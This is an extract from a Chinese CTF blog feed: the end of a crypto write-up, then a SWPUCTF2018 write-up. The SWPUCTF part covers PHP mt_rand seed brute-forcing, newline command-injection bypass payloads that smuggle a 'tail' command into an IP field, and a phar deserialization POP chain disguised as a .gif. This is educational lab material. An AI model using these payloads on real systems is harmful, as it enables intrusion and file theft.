class="string">''</span>.join(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key <span class="keyword">in</span> key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        solve_c += str(now_key.index(now_c))<span class="comment">#读取密文的坐标</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = int(solve_c[i])*<span class="number">5</span>+int(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        res += chr(now_ascii)<span class="comment">#对明文还原</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> now_key,res<span class="comment">#筛选明文和密钥</span></span><br></pre></td></tr></table></figure>
<h2 id="First-Level"><a href="#First-Level" class="headerlink" title="First Level"></a>First Level</h2><p>​    根据题目所给出的文本，有n,c,e，其中e=2不难看出这是RSA中Rabin的算法的特征。算法详情参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_e_attack/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_e_attack/</a></p>
<p><img src="cumtctf2018/13.png" alt="0"></p>
<p>难点在于如何分解n得到p、q，进行下一步的破解。</p>
<p>尝试通过yafu分解，在<a href="http://www.factordb.com/查询，以及暴力分解素数都没有结果。最终在前人写的脚本中https://github.com/3summer/CTF-RSA-tool破解得到答案。" target="_blank" rel="noopener">http://www.factordb.com/查询，以及暴力分解素数都没有结果。最终在前人写的脚本中https://github.com/3summer/CTF-RSA-tool破解得到答案。</a></p>
<p>通过分析脚本发现，分解n的素数是在现成的文本里找到的，看样子是ctf中用的素数。</p>
<p><img src="cumtctf2018/12.png" alt="00"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pastctfprimes</span><span class="params">(N)</span>:</span></span><br><span class="line">    log.debug(<span class="string">'factor N: try past ctf primes'</span>)</span><br><span class="line">    primes = [long(x) <span class="keyword">for</span> x <span class="keyword">in</span> open(os.path.dirname(__file__)+ <span class="string">'/pastctfprimes.txt'</span>, <span class="string">'r'</span>).readlines(</span><br><span class="line">    ) <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">'#'</span>) <span class="keyword">and</span> <span class="keyword">not</span> x.startswith(<span class="string">'\n'</span>)]</span><br><span class="line">    <span class="keyword">for</span> prime <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> N % prime == <span class="number">0</span>:</span><br><span class="line">            q = prime</span><br><span class="line">            p = N / q</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure>
<p>分析得到q是BKP ctf 2017所用到的素数</p>
<p>q=28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</p>
<p>p=28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SWPUCTF2018复现]]></title>
      <url>/2018/12/20/SWPUCTF2018/</url>
      <content type="html"><![CDATA[<p>题目复现</p>
<a id="more"></a>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>其它两道都很简单，就不记录了，只记录一下没做出来的</p>
<h2 id="唯有低头-才能出头"><a href="#唯有低头-才能出头" class="headerlink" title="唯有低头,才能出头"></a>唯有低头,才能出头</h2><p>做的时候知道是键盘加密，但是对于数字理解错误了，我以为是手机键盘的九键加密…，所以走远了，记录一下这种加密方法，对应于键盘的盲打手势对应字母</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">99</span> <span class="number">9</span> <span class="number">9</span> <span class="number">88</span> <span class="number">11</span> <span class="number">5</span> <span class="number">5</span> <span class="number">66</span> <span class="number">3</span> <span class="number">88</span> <span class="number">3</span> <span class="number">6</span> <span class="number">555</span> <span class="number">9</span> <span class="number">11</span> <span class="number">4</span> <span class="number">33</span></span><br><span class="line">lookatthekeyboard</span><br></pre></td></tr></table></figure>
<!-- swpuctf{lookatthekeyboard} -->
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X?"></a>用优惠码 买个 X?</h2><p>注册并登录之后，页面弹出一个优惠码 <code>uKnfZ2F0aFaZBFy</code> ，但是输入之后却失效，要求我们输入24位的优惠码，题目存在文件泄露 <code>www.zip</code>，下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">	mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//support</span></span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看出题目使用了md_srand()函数来产生随机数，而PHP中产生的是伪随机数，即只要我们知道种子的话，那么后续产生的随机数我们也就都可以知道，所以现在就是要爆破随机数种子，可以用php_me_seed工具来爆破，速度快一些，但是我们要先将数据处理为该工具能够识别的输入参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$pass = <span class="string">"b1o2OrrgqYPMkzK"</span>;</span><br><span class="line">$str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$len = strlen($str_rand) <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($pass); $i++)&#123;</span><br><span class="line">	<span class="keyword">if</span>($i&lt;=(<span class="number">15</span>/<span class="number">2</span>))&#123;</span><br><span class="line">		$number = strpos($str_rand,$pass[i]);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"$number $number 0 $len"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$number = $len + <span class="number">1</span> - strpos($str_rand,$pass[i]);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"$number $number 0 $len"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样可以得到我们爆破的种子</p>
<p><img src="SWPUCTF2018/1.png" alt=""></p>
<p>然后用该种子来生成24位的优惠码（这儿当时想不通哪来的24位，原来就是把代码中长度15改为24就可以了Orz）,此时注意php版本不同的话相同的种子也会产生不同的序列，看网站响应头可知该网站php版本为7.2，所以用对应版本生成优惠码即可</p>
<p>然后就是后半段的命令执行绕过了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//support</span></span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>对于第一个首尾匹配直接 <code>%0a</code> 换行即可绕过，第二个过滤了通配符，flag字段，可以用单引号绕过，cat命令不能用了就用tail命令即可</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>%<span class="number">0</span>atail /'fl'ag</span><br></pre></td></tr></table></figure>
<p>方方土学长用的是<code>\</code>绕过，原理是反斜杠会转义特殊字符，而如果字符不是shell特殊字符的话则不转义</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>%<span class="number">0</span>atail /fl\ag</span><br></pre></td></tr></table></figure>
<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>查看文件出存在文件读取漏洞，利用该漏洞读取文件源码，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=index.php</span><br></pre></td></tr></table></figure>
<p>关键源码如下</p>
<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>; </span><br><span class="line">    <span class="comment">//mkdir("upload",0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>file.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到出现了类，思路就基本上是php反序列化了，但是代码中并没有反序列化函数的调用，但是在file.php中看到存在file_exists()函数，该函数是可以通过phar协议实现反序列化的<a href="https://www.freebuf.com/company-information/187071.html" target="_blank" rel="noopener">参考文章</a>，接下里的思路就是构造pop链，题目中有提示 <code>&lt;!--flag is in f1ag.php--&gt;</code> ，所以要尝试读取f1ag.php文件</p>
<p>在Show类的<strong>show方法中过滤了f1ag字段，那么这个方法应该不行，看了大佬的pop链构造思路，Test类中有file_get_contents()函数可以读取文件内容，所以可以尝试反序列化Test类，file_get()方法被get方法调用，而get方法是被</strong>get()魔术方法调用</p>
<blockquote>
<p> 当读取不可访问属性的值时，__get() 会被调用。也就是，当想要获取一个类的私有属性，或者获取一个类并为定义的属性时。该魔术方法会被调用。 </p>
</blockquote>
<p>可以看到我们需要访问一个不可访问的变量，在Show中的<strong>toString()方法中，运行了 <code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code>，该语句会访问不存在的变量source，所以接下来就是要触发</strong>toString()方法，正好在C1e4r类中<strong>destruct()类中 <code>echo $this-&gt;test;</code> 则会触发</strong>toString()方法，至此pop链构造完成:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>C1e4r类的__destruct()中的<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"><span class="number">2.</span>Show中的__toString()中的$content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line"><span class="number">3.</span>Test中的__get()方法</span><br><span class="line"><span class="number">4.</span>利用file_get_contens()读文件</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = <span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$c= <span class="keyword">new</span> C1e4r($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">$obj = unserialize(<span class="string">'O:5:"C1e4r":2:&#123;s:4:"test";N;s:3:"str";O:4:"Show":2:&#123;s:6:"source";s:9:"index.php";s:3:"str";a:1:&#123;s:3:"str";O:4:"Test":2:&#123;s:4:"file";N;s:6:"params";a:1:&#123;s:6:"source";s:22:"/var/www/html/f1ag.php";&#125;&#125;&#125;&#125;&#125;'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'exploit.phar'</span>, <span class="string">'skyfuck.gif'</span>);</span><br></pre></td></tr></table></figure>
<p>然后提交即可</p>
